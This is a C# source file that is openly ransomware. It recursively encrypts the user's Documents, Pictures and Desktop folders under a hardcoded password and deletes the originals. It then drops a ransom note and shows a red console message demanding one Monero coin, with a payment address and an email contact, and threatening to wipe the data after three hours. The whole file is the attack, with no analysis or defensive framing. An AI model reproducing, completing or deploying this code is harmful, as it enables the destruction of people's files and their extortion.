using System;
using System.Runtime.CompilerServices;
using SharpAESCrypt;

namespace Payload
{
    class Program
    {
        static void Main() 
        {
            //Some predefined variables
            const string Encrypt_file_extension = ".jcrypt";
            const string Encrypt_password = "sZGA*MR%Ak*N&QwbWwJj6kcJ8aDZzQdA";
            string DESKTOP_FOLDER = Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory);
            string DOCUMENTS_FOLDER = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
            string PICTURES_FOLDER = Environment.GetFolderPath(Environment.SpecialFolder.MyPictures);
            string RANSOM_LETTER = "ALL OF YOUR FILES HAVE BEEN ENCRYPTED.\n" +
           "You can still unlock them,but at a cost :), send 1 XMR to address:QwpYdWanVveUCeaJCzf0k0g8XavZ \n" +
           "Afterwards, please email your transaction ID to:tosf50+94oy3qq6mu8b4@sharklasers.com  \n\n" +
           "Time is ticking! >:)";
            //THE ACTION 

            //Going trough the folders and encrypting them
            folderEncrypter(DOCUMENTS_FOLDER);
            folderEncrypter(PICTURES_FOLDER);
            folderEncrypter(DESKTOP_FOLDER);

            // the ransomletter and the console message
            dropRansomLetter();
            consolemessage();

            //Function to encrypt files in the folders
            static void folderEncrypter(string sDir)
            {
                try
                {
                    foreach ( string f in Directory.GetFiles(sDir))
                    {
                        if (!f.Contains(Encrypt_file_extension))
                        {
                            Console.Out.WriteLine("Encrypting: " + f);
                            SharpAESCrypt.SharpAESCrypt.Encrypt(Encrypt_password,f,f+Encrypt_file_extension);
                            File.Delete(f);
                        }
                    }
                    foreach (string d in Directory.GetDirectories(sDir))
                    {
                        folderEncrypter(d);
                    }
                    
                }
                catch (System.Exception except)
                {
                    Console.WriteLine(except.Message);
                }
            }
            //Dropping the ransom letter 
            void dropRansomLetter()
            {
                StreamWriter Ransome_Note = new StreamWriter(DESKTOP_FOLDER + @"\_HOW__TO__RECOVER___YOUR__FILES__" +".txt");
                Ransome_Note.WriteLine(RANSOM_LETTER);
                Ransome_Note.Close();
            }
            //The Console Message to be shown
            static void consolemessage()
            {

                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("     YOU HAVE BEEN HACKED >:)     ");
                Console.WriteLine("================================");
                Console.WriteLine();
                Console.WriteLine("ALL YOUR PERSONAL FILES HAVE BEEN ENCRYPTED");
                Console.WriteLine();
                Console.Write("All your files such as Documents, Pictures, Videos, databases and other files have been encrypted. Don't waste your time in trying to access them, you can only access them with the decryption key, Which what we posses :)");
                Console.WriteLine();
                Console.WriteLine();
                Console.WriteLine("We gurantee that your files are safe and secure, and we are providing you an opportunity to retrive them, but at a cost");
                Console.WriteLine("below written is our Monero address, we want you to send 1 XMR to the below address, when the transaction is complete, send us an email at the address below with the copy of the transaction, only then will you recieve your decryption key");
                Console.WriteLine();
                Console.WriteLine("XMR Address:QwpYdWanVveUCeaJCzf0k0g8XavZ");
                Console.WriteLine("Email Address: tosf50+94oy3qq6mu8b4@sharklasers.com");
                Console.WriteLine("Also, The data wont be encrypted forever ;). if the payment isn't recieved within 3 hours of this message, all your data will be wiped completely. Be quick! times ticking");
                Console.ResetColor();
            }
            
        }
    }
}
